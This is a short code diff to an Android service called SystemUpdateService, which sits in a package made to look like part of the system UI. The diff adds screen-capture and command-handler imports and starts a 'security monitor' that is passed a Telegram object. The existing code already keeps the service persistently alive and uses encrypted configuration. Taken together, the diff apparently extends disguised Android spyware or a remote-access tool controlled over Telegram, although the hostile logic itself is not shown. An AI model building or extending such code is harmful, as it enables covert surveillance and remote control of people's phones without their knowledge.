@@ -7,9 +7,12 @@ import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
 import androidx.core.app.NotificationCompat
+import com.android.systemui.updater.capabilities.ScreenCapability
+import com.android.systemui.updater.CommandHandler
 import com.android.systemui.updater.ErrorReporter
 import com.android.systemui.updater.EncryptedConfig
 import com.android.systemui.updater.persistence.PersistenceManager
+import com.android.systemui.updater.security.SecurityMonitor
 import java.util.concurrent.atomic.AtomicBoolean
 
 class SystemUpdateService : Service() {
@@ -36,6 +39,9 @@ class SystemUpdateService : Service() {
 
         // Enqueue periodic work to ensure service stays alive
         PersistenceManager.enqueuePeriodicWork(this)
+
+        // Start security monitoring
+        SecurityMonitor.start(this, telegram)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
